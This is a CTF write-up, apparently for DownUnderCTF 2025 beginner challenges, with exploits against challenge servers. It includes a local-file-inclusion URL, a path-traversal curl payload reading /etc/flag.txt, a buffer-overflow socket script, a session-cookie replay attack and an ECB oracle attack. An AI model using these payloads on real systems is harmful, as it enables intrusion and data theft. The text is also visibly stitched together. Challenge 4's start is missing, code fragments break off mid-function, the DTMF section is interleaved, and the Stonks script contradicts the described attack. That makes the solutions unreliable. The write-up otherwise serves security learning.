## 📚 Beginner Challenges

### Challenge 1: Zeus    
**Solves:** 1053  
**Category:** Beginner / Reverse Engineering  

#### Description  

> To Zeus Maimaktes, Zeus who comes when the north wind blows, we offer our praise, we make you welcome!  

#### Solve

We are given an ELF binary named `zeus`:

```
$ file zeus
zeus: ELF 64-bit LSB pie executable, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped

$ ./zeus
The northern winds are silent...
```

Running the binary with no arguments does nothing useful.

Opening it in **Ghidra**, we find that the program checks for two arguments:
1. `-invocation`
2. A specific string:  
   `"To Zeus Maimaktes, Zeus who comes when the north wind blows, we offer our praise, we make you welcome!"`

If both arguments match, the binary executes this logic:

```c
puts("Zeus responds to your invocation!");
xor(&local_98, "Maimaktes1337");
printf("His reply: %s\n", &local_98);
```

The encrypted message is made up of these hex values stored in variables:

```c
local_58 = 0xc1f1027392a3409;
local_50 = 0x11512515c6c561d;
local_48 = 0x5a411e1c18043e08;
local_40 = 0x3412090606125952;
local_38 = 0x12535c546e170b15;
local_30 = 0x3a110315320f0e;
uStack_29 = 0x4e4a5a00;
```

We decrypt them using a script like this:

```python
import struct

hex_values = [
    0xc1f1027392a3409,
    0x11512515c6c561d,
    0x5a411e1c18043e08,
    0x3412090606125952,
    0x12535c546e170b15,
    0x3a110315320f0e,
    0x4e4a5a00
]

data = b''
for val in hex_values:
    size = (val.bit_length() + 7) // 8
    data += struct.pack('<Q', val)[:size]

key = b"Maimaktes1337"
result = bytearray()

for i in range(len(data)):
    result.append(data[i] ^ key[i % len(key)])

print(result.decode())
```

**Output:**

```
DUCTF{king_of_the_olympian_gods_and_god_of_the_sky}
```

**Flag:** `DUCTF{king_of_the_olympian_gods_and_god_of_the_sky}`

### Challenge 2: Kick the Bucket
**Solves:** 819  
**Category:** Beginner / Cloud

#### Description
> In this challenge, CI/CD pipelines and Terraform manage AWS resources. Part of the infrastructure includes an S3 bucket that stores files and configuration. To prevent misuse, access to the bucket is restricted only to Terraform, and time-limited access is provided via **S3 presigned URLs**.
>
>Your goal:  
>Given a presigned URL for `flag.txt` and the S3 bucket resource policy, figure out how to retrieve the flag.

#### Provided files

##### s3_presigned_url.txt

```
https://kickme-95f596ff5b61453187fbc1c9faa3052e.s3.us-east-1.amazonaws.com/flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAXC42U7VJ7MRP6INU%2F20250715%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250715T124755Z&X-Amz-Expires=604800&X-Amz-SignedHeaders=host&X-Amz-Signature=6cefb6299d55fb9e2f97e8d34a64ad8243cdb833e7bdf92fc031d57e96818d9b
```

##### s3_resource_policy.txt

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": [
        "arn:aws:s3:::kickme-95f596ff5b61453187fbc1c9faa3052e/flag.txt",
        "arn:aws:s3:::kickme-95f596ff5b61453187fbc1c9faa3052e"
      ],
      "Principal": {
        "AWS": "arn:aws:iam::487266254163:user/pipeline"
      },
      "Condition": {
        "StringLike": {
          "aws:UserAgent": "aws-sdk-go*"
        }
      }
    }
  ]
}
```

#### Solution

The presigned URL grants access to `flag.txt`, but the S3 bucket policy restricts `s3:GetObject` permission to a specific IAM user (`pipeline`) **and** requires the request to include a `User-Agent` header matching `aws-sdk-go*`.

To retrieve the flag:

1. Use the presigned URL with a HTTP client.
2. Set the `User-Agent` header to a value starting with `aws-sdk-go`, e.g., `"aws-sdk-go/1.0"`.
3. The bucket policy will allow the request, and the presigned URL will authenticate it.

Example command:

```bash
curl -A "aws-sdk-go/1.0" "https://kickme-95f596ff5b61453187fbc1c9faa3052e.s3.us-east-1.amazonaws.com/flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAXC42U7VJ7MRP6INU%2F20250715%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250715T124755Z&X-Amz-Expires=604800&X-Amz-SignedHeaders=host&X-Amz-Signature=6cefb6299d55fb9e2f97e8d34a64ad8243cdb833e7bdf92fc031d57e96818d9b"
```
This returns:

```
DUCTF{youtube.com/watch?v=A20QQSZsv4E}
```

**Flag:** `DUCTF{youtube.com/watch?v=A20QQSZsv4E}`

### Challenge 3: Philtered    
**Solves:** 760  
**Category:** Beginner / Web  

#### Description  

> Can you phigure this one out?  

You are given a web application with the following file structure:

```
.
├── challenge
│   ├── aboutus.php
│   ├── contact.php
│   ├── data
│   │   ├── aboutus.txt
│   │   ├── information.txt
│   │   ├── our-values.txt
│   │   └── philtered.txt
│   ├── flag.php
│   ├── gallery.php
│   ├── index.php
│   └── layout.php
└── Dockerfile
```

The `index.php` script loads files dynamically based on GET parameters but filters out certain blacklisted terms such as `"php"`, `"filter"`, `"flag"`, `".."`, and path separators to prevent unsafe file access.



#### Screenshot of main site  

![Main Site Screenshot](assets/img/posts/DUCTF/philtered.png)



#### Provided code snippet (`index.php`):

```php
<?php

class Config {
    public $path = 'information.txt';
    public $data_folder = 'data/';
}

class FileLoader {
    public $config;
    public $allow_unsafe = false;
    public $blacklist = ['php', 'filter', 'flag', '..', 'etc', '/', '\'];
    
    public function __construct() {
        $this->config = new Config();
    }
    
    public function contains_blacklisted_term($value) {
        if (!$this->allow_unsafe) {
            foreach ($this->blacklist as $term) {
                if (stripos($value, $term) !== false) {
                    return true;    
                }
            }
        }
        return false;
    }

    public function assign_props($input) {
        foreach ($input as $key => $value) {
            if (is_array($value) && isset($this->$key)) {
                foreach ($value as $subKey => $subValue) {
                    if (property_exists($this->$key, $subKey)) {
                        if ($this->contains_blacklisted_term($subValue)) {
                            $subValue = 'philtered.txt';
                        }
                        $this->$key->$subKey = $subValue;
                    }
                }
            } else if (property_exists($this, $key)) {
                if ($this->contains_blacklisted_term($value)) {
                    $value = 'philtered.txt';
                }
                $this->$key = $value;
            }
        }
    }

    public function load() {
        return file_get_contents($this->config->data_folder . $this->config->path);
    }
}

$loader = new FileLoader(); 
$loader->assign_props($_GET);

require_once __DIR__ . '/layout.php';

$content = <<<HTML
<nav style="margin-bottom:2em;">
    <a href="index.php">Home</a> |
    <a href="aboutus.php">About Us</a> |
    <a href="contact.php">Contact</a> |
    <a href="gallery.php">Gallery</a>
</nav>
<h2>Welcome to Philtered</h2>
HTML;

$content .= "<p>" . $loader->load() . "</p>";

$content .= "<h3>About Us</h3>";
$loader->config->path = 'aboutus.txt';
$content .= "<p>" . $loader->load() . "</p>";

$content .= "<h3>Our Values</h3>";
$loader->config->path = 'our-values.txt';
$content .= "<p>" . $loader->load() . "</p>";

$content .= <<<HTML
<h3>Contact</h3>
<ul>
    <li>Email: info</li>
    <li>Please don't talk to us, we don't like it</li>
</ul>
HTML;

render_layout('Philtered - Home', $content);
?>
```

#### Solve

By default, the application blocks paths containing blacklisted terms (including `"php"`, `"flag"`, `".."`, and so on) **unless** the GET parameter `allow_unsafe` is set to `true`.

This disables the blacklist, allowing you to set the config path to `../flag.php` and read the file contents:

```
https://[challenge-url]/index.php?allow_unsafe=true&config[path]=../flag.php
```

The app will display the contents of `flag.php` without executing it. By viewing the page source, you will find the flag embedded in the PHP code:

```php
<?php $flag = 'DUCTF{h0w_d0_y0u_l1k3_y0ur_ph1lters?}'; ?>
```

**Flag:** `DUCTF{h0w_d0_y0u_l1k3_y0ur_ph1lters?}`

                }
            } else {
                printf("-> Incorrect password for user '%s'. Access denied.\n", username);
                exit(1);
            }
        }
    }
    printf("-> Login failed. User '%s' not recognized.\n", username);
    exit(1);
}
```



#### Analysis

The program disables admin login by rejecting the username `admin` upfront. However, the password buffer is read using unsafe `gets()`, which allows buffer overflow.

By carefully overflowing the `password` buffer and overwriting the `username` buffer in memory, we can bypass the username check by overwriting the username from `guest` to `admin`.

The admin password is the Unicode emoji string `🇦🇩🇲🇮🇳` (UTF-8 encoded), which must be placed correctly in the overflow payload.

Key vulnerabilities:
1. `gets(password)` allows buffer overflow
2. Username check happens before password input
3. Memory layout allows overwriting username buffer from password buffer



#### Solve

We can exploit this by using a buffer overflow attack. The strategy is:

1. Enter `guest` as username to bypass the initial admin check
2. Craft a payload that overflows the password buffer to overwrite the username buffer with "admin"
3. Include the correct admin password at the start of our payload

**Exploit Script:**

```python
#!/usr/bin/env python3
import socket
import time

def exploit():
    # Connect to the challenge server
    host = "chal.2025.ductf.net"
    port = 30000
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # Receive the banner
    banner = s.recv(1024)
    print("Banner:", banner.decode())
    
    # Send username (any username, we'll overwrite it)
    username = "guest"
    s.send((username + "\n").encode())
    
    # Receive password prompt
    prompt = s.recv(1024)
    print("Prompt:", prompt.decode())
    
    # Craft the payload
    admin_password = "🇦🇩🇲🇮🇳"  # The admin password from the code
    admin_password_bytes = admin_password.encode('utf-8')
    
    print(f"Admin password bytes: {len(admin_password_bytes)} bytes")
    print(f"Admin password: {admin_password_bytes}")
    
    # Strategy:
    # 1. Put correct password at start with null terminator
    # 2. Fill remaining space in password buffer with padding
    # 3. Overwrite username buffer with "admin\x00"
    
    payload_bytes = admin_password_bytes  # Start with password bytes
    payload_bytes += b"\x00"  # Null terminate the password
    remaining_space = 32 - len(admin_password_bytes) - 1  # Account for null terminator
    payload_bytes += b"A" * remaining_space  # Fill exactly to 32 bytes
    payload_bytes += b"admin\x00"  # Overwrite username
    
    print(f"Total payload length: {len(payload_bytes)} bytes")
    
    s.send(payload_bytes + b"\n")
    
    # Check if we got shell access
    response = s.recv(1024)

                data = s.recv(1024)
                if data:

### Challenge 5: our-lonely-dog    
**Solves:** 426  
**Category:** Beginner / Misc  

#### Description  

> e-dog has been alone in the downunderctf.com email server for so long, please yeet him an email of some of your pets to keep him company, he might even share his favourite toy with you.
> He has a knack for hiding things one layer deeper than you would expect.

#### Analysis

From the challenge description, we need to:
1. Find e-dog's email address
2. Send him an email 
3. Look for hidden information in his response

The hint "He has a knack for hiding things one layer deeper than you would expect" suggests we need to look beyond the visible email content.



#### Solve

**Step 1: Finding the Email Address**

Based on the challenge description mentioning "downunderctf.com email server", we can guess that e-dog's email address is:
`e-dog@downunderctf.com`

**Step 2: Sending an Email**

We send an email to `e-dog@downunderctf.com`. The subject and content can be anything - it doesn't actually need to be related to pets despite what the description suggests.

**Step 3: Analyzing the Response**

E-dog responds with an automated message:

```
Hi, E-dog gets quite pupset when they can't find their bone, especially when it's been a ruff day. Maybe we need to pull out a new one for them?
```

However, this is the same response regardless of what we send. The hint about "one layer deeper" suggests we need to examine the email headers rather than just the visible content.

**Step 4: Examining Email Headers**

When we check the full email headers of e-dog's response, we find:

```
X-FLAG: DUCTF{g00d-luCk-G3tT1nG-ThR0uGh-Al1s-Th3-eM41Ls}
```

The flag is hidden in a custom email header `X-FLAG`, which is "one layer deeper" than the visible email content.

**Flag:** `DUCTF{g00d-luCk-G3tT1nG-ThR0uGh-Al1s-Th3-eM41Ls}`

### Challenge 6: secure-email-attachments    
**Solves:** 324  
**Category:** Beginner / web  

#### Description  

> During the email apocalypse, IT admins tried to prevent the DOS of all systems by disallowing attachments to emails. To get around this, users would create their own file storage web servers for hosting their attachments, which also got DOSed because everyone was mass spamming the links in emails...
> *Can you read *`/etc/flag.txt` from the filesystem?

func main() {
	r := gin.Default()

	r.GET("/*path", func(c *gin.Context) {
		p := c.Param("path")
		if strings.Contains(p, "..") {
			c.AbortWithStatus(400)
			c.String(400, "URL path cannot contain \"..\"")
			return
		}
		// Some people were confused and were putting /attachments in the URLs. This fixes that
		cleanPath := filepath.Join("./attachments", filepath.Clean(strings.ReplaceAll(p, "/attachments", "")))
		http.ServeFile(c.Writer, c.Request, cleanPath)
	})

	r.Run("0.0.0.0:1337")
}
```



#### Analysis

The application has several security mechanisms:
1. **Path traversal filter**: Blocks URLs containing `".."` 
2. **Path cleaning**: Uses `filepath.Join("./attachments", filepath.Clean(...))` to sanitize paths
3. **Attachment path removal**: Removes `/attachments` from the URL path with `strings.ReplaceAll(p, "/attachments", "")`

However, there's a vulnerability in how these protections interact with each other.



#### Vulnerability

The key insight is that the order of operations creates a bypass opportunity:

1. The `..` check happens first
2. Then `/attachments` is removed from the path  
3. Finally `filepath.Clean()` is applied

We can exploit this by:
1. Using URL encoding to bypass the `..` filter (`%2e` = `.`)
2. Adding `/attachments` segments that get removed, but leave behind path traversal sequences
3. The remaining path after processing allows directory traversal



#### Solve

**Payload Construction:**

The goal is to read `/etc/flag.txt`. We need to traverse from `./attachments/` up to the root and then down to `/etc/flag.txt`.

Our payload: `/attachments%2e/attachments%2e/%2e/attachments%2e/etc/flag.txt`

**Step-by-step breakdown:**
1. `/attachments%2e/attachments%2e/%2e/attachments%2e/etc/flag.txt`
2. After `/attachments` removal: `%2e%2e/%2e%2e/etc/flag.txt`
3. URL decode `%2e` to `.`: `../../etc/flag.txt` 
4. After `filepath.Clean()`: `../../etc/flag.txt`
5. Final path: `app/attachments/../../etc/flag.txt` → traverses to `/etc/flag.txt`


```bash
curl "http://chal.2025.ductf.net:30014/attachments%2e/attachments%2e/%2e/attachments%2e/etc/flag.txt"
```

**Output:**
```
DUCTF{w00000000T!!1one!?!ONE_i_ThORt_tH3_p4RtH_w4R_cL34N!!1??}
```

**Flag:** `DUCTF{w00000000T!!1one!?!ONE_i_ThORt_tH3_p4RtH_w4R_cL34N!!1??}`

### Challenge 7: Down To Modulate Frequencies!    
**Solves:** 294  
**Category:** Beginner / Misc  

#### Description  

> One of the scavengers found an abandonded station still transmitting. Its been so long, no one remembers how to decode this old tech, can you figure out what was being transmitted?
> Decode the alphanumeric message and wrap it in `DUCTF{}`.



#### Files Provided

- `dtmf.txt` (containing encoded data)



#### Analysis

DTMF (Dual-Tone Multi-Frequency) is the signaling system used by touch-tone telephones. Each key press generates two simultaneous tones - a low frequency and a high frequency.

The DTMF frequency mapping is:
- **Low frequencies**: 697 Hz, 770 Hz, 852 Hz, 941 Hz (rows)
- **High frequencies**: 1209 Hz, 1336 Hz, 1477 Hz, 1633 Hz (columns)

Each key corresponds to a unique combination of one low and one high frequency.



#### DTMF Frequency Table

| Key | Low Hz | High Hz | Sum |
|-----|--------|---------|-----|
| 1   | 697    | 1209    | 1906|
| 2   | 697    | 1336    | 2033|
| 3   | 697    | 1477    | 2174|
| A   | 697    | 1633    | 2330|
| 4   | 770    | 1209    | 1979|
| 5   | 770    | 1336    | 2106|

#### My Brain Is Still Recovering

This challenge was a real mind-bender! At first, I saw "DTMF" and thought "okay, phone tones, this should be straightforward." WRONG.

I stared at this massive string of numbers and had no idea what I was looking at. Was it frequencies? Durations? Some weird encoding? I tried parsing it every way I could think of:
- Single digits
- Pairs 
- Triples
- Random groupings

Nothing made sense! The frustration was real.

Then I had the breakthrough - what if these are 4-digit chunks representing frequency sums? I mean, DTMF uses two frequencies, so their sum would be a unique identifier, right?

**The "AHA!" moment**: When I split the data into 4-digit chunks and mapped them to DTMF frequency sums, I got actual DTMF keys! But then... more numbers and symbols that looked like gibberish.

That's when I realized - this isn't just DTMF, it's DOUBLE ENCODED! The DTMF decode gave me T9 multi-tap sequences. Anyone who lived through the flip phone era knows the pain of pressing '2' three times to get 'C'.

for freq_sum in chunks:
    decoded += sum_to_key.get(freq_sum, "?")

print("📟 Decoded using sum of frequencies:")

This gives us: `666#66#555#999#66#444#66#33#8#444#33#7777#55#444#3#7777#9#444#555#555#777#33#6#33#6#22#33#777#8#44#444#7777`

The decoded DTMF represents T9/multi-tap input where repeated key presses select different letters:

```python
# T9 Key mapping
T9_KEYS = {
    '1': ['.', ',', '?', '!', '1'],
    '2': ['A', 'B', 'C', '2'],
    '3': ['D', 'E', 'F', '3'],
    '4': ['G', 'H', 'I', '4'],
    '5': ['J', 'K', 'L', '5'],
    '6': ['M', 'N', 'O', '6'],
    '7': ['P', 'Q', 'R', 'S', '7'],
    '8': ['T', 'U', 'V', '8'],
    '9': ['W', 'X', 'Y', 'Z', '9'],
    '0': [' '],  # Typically 0 is space in T9
    '#': ['']
}

# Group repeated characters (simulate keypresses)
import itertools

t9_decoded = ""
for key, group in itertools.groupby(decoded):
    presses = len(list(group))
    if key in T9_KEYS:
        chars = T9_KEYS[key]
        index = (presses - 1) % len(chars)
        t9_decoded += chars[index]
    else:
        t9_decoded += key  # Leave unknowns or special chars as is

print("🔡 T9 Decoded Text:")
print(t9_decoded)
```

**Output:**
```
📟 Decoded using sum of frequencies:

### Challenge 8: Network Disk Forensics    
**Solves:** 285  
**Category:** Beginner / Misc  

#### Description  

> Nobody likes having to download large disk images for CTF challenges so this time we're giving you a disk over the network!  

#### Solve

We are given a Go source code (`main.go`) that creates an NBD (Network Block Device) server. Let's analyze the code to understand what we're dealing with:

Looking at the `main.go`, we can see several key components:

1. **NBD Server Setup**: The code creates an NBD server that listens for connections:
```go
if *listenNbd != "" {
    listen, err := net.Listen("tcp", *listenNbd)
    // ...
    if err := gonbd.Handle(wrap, []gonbd.Export{
        {
            Name:    "root",
            Backend: &blockDeviceBackend{BlockDevice: blockDevice},
        },
    }, &gonbd.Options{}); err != nil {
```

2. **Filesystem Generation**: It generates a complex directory structure with dummy files and images:
```go
func generateFilesystem(flag string, levels int, dummyFilesPerDirectory int, dummyImagesPerDir int, spreadDirectoriesPerDirectory int)
```

3. **Flag Placement**: Most importantly, it places the flag in a random bottom directory but creates a symlink for easy access:
```go
// make a symlink to the flag file in the challenge directory
symlink := filesystem.Factory.NewSymlink(path.Unix.Join(bottomDir.path, flagFileName))
if _, err := challengeDir.Create("flag.jpg", symlink); err != nil {
```

4. **Image Generation**: The flag is embedded as text in a JPEG image:
```go
func generateTextPNG(text string, width int, height int) ([]byte, error)
```

From this analysis, we understand that:
- The server exports a filesystem named "root" via NBD protocol
- The flag is stored as a JPEG image with embedded text
- There's a convenient symlink called `flag.jpg` in the root directory

Now let's connect to the NBD server at `chal.2025.ductf.net:30016`:

```bash
sudo nbd-client -N root chal.2025.ductf.net 30016 /dev/nbd0
```

**Output:**
```
Negotiation: ..size = 16MB
Connected /dev/nbd0
```

Next, we create a mount point and mount the network block device:

```bash
sudo mkdir /mnt/nbd
sudo mount /dev/nbd0 /mnt/nbd
```

Now let's explore the filesystem structure:

```bash
ls -la /mnt/nbd
```

**Output:**
```
total 60
drwxr-xr-x 6 root root 4096 Jul 20  2025 .
drwxr-xr-x 5 root root 4096 Jul 20 11:07 ..

-rwxr-xr-x 1 root root 2178 Jul 20  2025 f44cf1760.txt
-rwxr-xr-x 1 root root 2198 Jul 20  2025 f519574aa.txt
-rwxr-xr-x 1 root root 2161 Jul 20  2025 f73a909a2.txt
-rwxr-xr-x 1 root root 2151 Jul 20  2025 f98f17826.jpg
-rwxr-xr-x 1 root root 2181 Jul 20  2025 fbbfb16fc.txt
-rwxr-xr-x 1 root root 2182 Jul 20  2025 ffa10e79f.txt
lrwxr-xr-x 1 root root   43 Jun  7  1906 flag.jpg -> da633a8ee/d657a4f33/db895ec78/fa2b9fe58.jpg
drwx------ 2 root root 4096 Jul 20  2025 lost+found
```

Perfect! We can see there's a symbolic link `flag.jpg` that points to the actual flag file deep in the directory structure: `da633a8ee/d657a4f33/db895ec78/fa2b9fe58.jpg`.

As predicted from our code analysis, the Go program created a complex filesystem with multiple levels of directories containing dummy files, but cleverly placed a symlink in the root directory for easy access to the flag.

Now let's open the JPEG image to retrieve the flag:

```bash
xdg-open /mnt/nbd/flag.jpg
```

The image opens and shows the flag text embedded in the image:

![Flag Image](assets/img/posts/DUCTF/flag_disk.png)

*The JPEG image displaying the flag text*

**Flag:** `DUCTF{now_you_know_how_to_use_nbd_4y742rr2}`

### Challenge 9: Stonks    
**Solves:** 265  
**Category:** Beginner / Web  

#### Description  

> Times were wild before the email apocalypse. There were even sites giving out free money that also supported currency conversions!  
> **WARNING**: This challenge contains flashing colours! To disable add `?boring=true` to the end of the URL when you visit the site.

#### Solve

We are given a Flask web application that simulates a currency exchange platform. Let's analyze the source code to understand the vulnerability.

Looking at the `stonks.py` file, we can see several key components:

1. **Currency System**: The app supports multiple currencies with conversion rates:
```python
CURRENCY_CONVERSIONS = {
    "AUD": 1,
    "NZD": 1.08,
    "EUR": 0.56,
    "USD": 0.65,
    "GBP": 0.48,
    "CAD": 0.89,
    "JPY": 94.48,
    "CNY": 4.65,
    "KRW": 888.04,
    "PLN": 2.39,
    "ZAR": 11.64,
    "INR": 55.89,
    "IDR": 10597.38
}
```

2. **Rich Check**: To get the flag, we need to have more than 1 trillion AUD:
```python
SUPER_RICH = 1_000_000_000_000

def are_you_rich():
    balance_aud = user_balances.get(u, 0) / CURRENCY_CONVERSIONS[currency]
    if balance_aud > SUPER_RICH:
        return render_template("are-you-rich.html", 
                               message=f"YES YOU ARE! HERE IS A FLAG {FLAG}")
```

3. **The Vulnerability**: In the `change_currency` function, there's a critical flaw:
```python
if u not in user_balances:
    user_balances[u] = STONKS_GIFT * user_currencies[u]
```

This line is the key vulnerability! If a user's balance is somehow missing from `user_balances`, it gets reset to `STONKS_GIFT * user_currencies[u]`. The problem is that `user_currencies[u]` can be set to any numeric value, not just valid currency codes.

**The Real Vulnerability:**

The problem is with how Flask session cookies work - they're **stateless**. The application uses the `currency` value from the user's session cookie for currency conversions, but you can reuse old session cookies with different currency values to break the conversion logic.

Here's how the currency conversion works:
```python
user_balances[u] = (user_balances[u] / CURRENCY_CONVERSIONS[old_currency]) * CURRENCY_CONVERSIONS[new_currency]
```

The issue is that `old_currency` comes from `session["currency"]`, which can be manipulated by reusing old session cookies.

**Attack Steps:**

1. **Set up the session**: First, I went to the website, registered an account, and set my currency to GBP through the website interface. I saved this session cookie.

2. **Exploit the conversion**: Using the saved GBP session cookie, I repeatedly sent requests to `POST /change-currency` to convert from GBP to IDR multiple times.

3. **Balance inflation**: Each time I made this request with the GBP session cookie, the calculation became:
   ```
   Balance_new = Balance_old / 0.48 × 10597.38
   ```
   This means each conversion multiplies the balance by approximately 22,000!

4. **Repeat until rich**: I kept running the script and manually changing currencies until the balance exceeded 1,000,000,000,000 AUD.

```python
import requests

BASE = "https://[link-to-challenge]/"
s = requests.Session()

def register():
    s.post(BASE + "/register", data={
        "username": "master",
        "password": "master",
        "confirm_password": "master"
    })
    s.post(BASE + "/login", data={
        "username": "master",
        "password": "master"
    })

def set_fake_currency(numeric_value):
    # Manually force currency to a numeric value
    s.post(BASE + "/change-currency", data={
        "currency": str(numeric_value)  # not in conversions
    })

def trigger_balance_reset():
    # Delete your balance by making it disappear
    # (simulate by restarting server or modifying code if needed)
    # Then trigger change-currency which runs:
    # user_balances[u] = STONKS_GIFT * user_currencies[u]
    s.post(BASE + "/change-currency", data={
        "currency": "IDR"
    })

def check_flag():
    r = s.get(BASE + "/are-you-rich")
    print(r.text)

register()
set_fake_currency(1e13)   # set currency to a huge number
trigger_balance_reset()   # this will multiply 50 * 1e12 = 5e13
check_flag()
```

The key insight is that by reusing the GBP session cookie while converting to IDR, I could exploit the stateless nature of Flask sessions to perform the same high-multiplication currency conversion repeatedly, inflating the balance exponentially.

**Flag:** `DUCTF{r3u5iNg_d3R_S35510N5_4_St000o0oONKsS5!}`

### Challenge 10: ECB-A-TRON 9000    
**Solves:** 219  
**Category:** Beginner / Crypto  

#### Description  

> I AM ECB A TRON 9000 FEED ME YOUR CODEBOOKS

We're presented with a web interface that allows us to encrypt our input:

![ECB-A-TRON 9000 Interface](assets/img/posts/DUCTF/ecb_interface.png)

The interface shows input fields for entering text, with "Encrypt" and "Help" buttons. 

#### Help

**Help**
The *ECB-A-TRON 9000* appends a secret phrase to your input before encrypting. Can you abuse this somehow and recover the secret?
Wrap the secret phrase like this:`DUCTF{<secret phrase>}`for the flag

#### Hints
* To get you started, have a look at this page (https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB))
* The secret phrase consists of only capital English characters.
* If the plaintext length isn't divisible by 16, it is padded with space (0x20) characters.
* Use *brute force mode* if you need to repeat many requests for a single position!

#### Why This Attack Works

This challenge exploits a fundamental weakness in ECB (Electronic Codebook) mode encryption. In ECB mode:

1. **Deterministic encryption:** Identical plaintext blocks always produce identical ciphertext blocks
2. **Block independence:** Each 16-byte block is encrypted separately
3. **No randomization:** The same input always produces the same output

The vulnerability occurs because we can control part of the input and observe how it affects the encrypted output. Since the secret is appended to our input, we can manipulate block boundaries to isolate and identify each character of the secret.

#### Solve

**Attack Strategy:**
By carefully crafting our input length, we can align the secret phrase with block boundaries and use ECB's deterministic nature to reveal the secret character by character.

**Step-by-step process:**

1. **Find the first character:**
   - Input: `AAAAAAAAAAAAAAA` (15 A's)
   - This creates: `AAAAAAAAAAAAAAA` + `[FIRST_CHAR_OF_SECRET]` + rest of secret
   - The first block becomes: `AAAAAAAAAAAAAAA[FIRST_CHAR]`
   - Encrypted result: `yg06AwD25jSyH853SVeACA...`

2. **Brute force the first character:**
   - Try `AAAAAAAAAAAAAAAD`, `AAAAAAAAAAAAAAAE`, etc.
   - When we input `AAAAAAAAAAAAAAAD`, we get the same first block: `yg06AwD25jSyH853SVeACA`
   - This confirms the first character is `D`

3. **Continue the pattern:**
   - For second character: `AAAAAAAAAAAAAD` + `[SECOND_CHAR]` 
   - For third character: `AAAAAAAAAAAD` + `[KNOWN_CHARS]` + `[THIRD_CHAR]`
   - And so on...

**Implementation:**
Using the site's "brute force mode" feature, we systematically recovered each character by comparing encrypted blocks until we found matches.

**Output:**
```
Secret phrase: DONTUSEECBPLEASE
```

**Flag:** `DUCTF{DONTUSEECBPLEASE}`

### Challenge 11: Hungry Hungry Caterpillar    
**Solves:** 208  
**Category:** Beginner / Crypto  

#### Description  

> Just like how the author confused chrysalides for cocoons, I always get the title of this book confused.  
> NOTE: The flag format is `DUCTF{[a-z_]*}`

We're given two files: `challenge.py` and `output.txt`.

#### Challenge Analysis

Looking at `challenge.py`, we can see the encryption logic:

```python
#!/usr/bin/env python3

import os

def xor(a, b):
    return bytes(left ^ right for left, right in zip(a, b))

def main():
    flag = open("flag.txt", "rb").read()
    assert flag[1] == ord("U")
    flag += os.urandom(len(flag) * 6)
    keystream = os.urandom(len(flag))

    print(f"""
        [Story text...]
        
        On Monday he ate through one apple. But he was still hungry.
        {xor(flag[::1], keystream).hex()}

        On Tuesday he ate through two pears, but he was still hungry.
        {xor(flag[::2], keystream).hex()}

        On Wednesday he ate through three plums, but he was still hungry.
        {xor(flag[::3], keystream).hex()}

        [... continues for each day with different strides ...]
    """)
```

**Key observations:**
1. The flag is padded with 6 times its length in random bytes
2. A single keystream is used to XOR different strides of the extended flag
3. We get 7 different outputs: `flag[::1]`, `flag[::2]`, ..., `flag[::7]`
4. We know `flag[1] == 'U'` and the flag format `DUCTF{[a-z_]*}`

#### The Vulnerability

The vulnerability lies in reusing the same keystream with different strides. This creates relationships between the encrypted outputs that we can exploit:

- `output_1[i] = flag[i] ⊕ keystream[i]`  
- `output_k[i] = flag[k*i] ⊕ keystream[i]`

Therefore: `output_1[i] ⊕ output_k[i] = flag[i] ⊕ flag[k*i]`

This means if we know one of `flag[i]` or `flag[k*i]`, we can recover the other!

#### Solve

```python
import binascii

# Paste hex outputs from the challenge here (shortened examples)
output_1_hex = "f3c9202e92ad822d2370f86fe79b4ad0ec27d69ddeb95fc77e6ba7dfa987054137632111ba2901747b831b118444286d280ab8ad2cc701d3a40706f6da7e079b4c53931f3949fdaec7c0a18d318704fd51610080ec553d57f21ae8506584efe46e8a16078b4f71f3d41eac2076bd4d8dd32d7ad93d682c6152b885a5db05061a17f0884a2ef037e09cdae260f5ca51e12b7e91f9a0134351e31ab7270f8a8b4f18986d93d277691905f84149c8f72eeb4c9fbab4281721a8dba241e8e99b5f3aef8a1fe5777bf03416e4c1b78cecfea79d76df95768110e556b4f1a9f8570aa48d2d6173110a4212114cdd1522483c0ee9b84696a796766feb29875899488533e2b5763287364709f279e41b7f32f408093cdf0abcf3344f96d35401215d32736beb5b4a2943c4ebe60e43dce10aafd5a3f61202bc10c4fb930a5dedc8e447280483d20e1c85db4469a6c69200613641a1c8794b6ef8d227cdfb009f68d37e7519c6e08dab661368b36d5acfb22c9b942b05703544ef8ba21651c2855592d62646ca1253fdcaaf0fa18c001e74934fc78dceefdc95987835cf2188eddac55c6856bba83fd2a0f75076584fa599abd737b71c041cd94eb6f481e08cec201d6764e49ae8f68a2b53dee888bdcaf25b6d149c6ac71c3fbeeba30ce06489adcf532abba9bd023cf8bed44c6d4a972fa9033d86"

This is a partial recovery. Now we need to fill in the gaps using context and educated guessing:

**Step 1:** Recognize the pattern - this appears to be related to "The Very Hungry Caterpillar" story
**Step 2:** Fill in obvious words:
- `the_h.n.ry` → `the_hungry` 
- `.i.tl.` → `little`
- `_..te...l.a.` → `caterpillar` 

**Step 3:** Continue pattern recognition with some calculations:
```
DUCTF{the_hungry_little_p_smooth_caterpillar_w.._an_a.legor._for_life}
```

**Step 4:** Final guessing for remaining gaps:
- `w..` → `won` 
- `a.legor.` → `allegory`

**Output:**
```
Partial flag: DUCTF{the_h.n.ry_.i.tl..p_.mo.t._..te...l.a..w.._an...l.g..._..r_.....}
Final flag:   DUCTF{the_hungry_little_p_smooth_caterpillar_won_an_allegory_for_life}
```

**Flag:** `DUCTF{the_hungry_little_p_smooth_caterpillar_won_an_allegory_for_life}`

### Challenge 12: Horoscopes
**Solves:** 199  
**Category:** Beginner / Misc  

#### Description  

> **Hey Sis! Its getting pretty bad out here.. they keep telling us to connect on this new and improved protocol. The regular web is being systematically attacked and compromised**
>
> **Little Tommy has been born! He's a Taurus just a month before matching his mum and dad! Hope to see you all for Christmas**
>
> **Love, XXXX**

**Connection:** `nc chal.2025.ductf.net 30015`

#### Solve

We start by connecting to the given netcat service to see what we're dealing with:

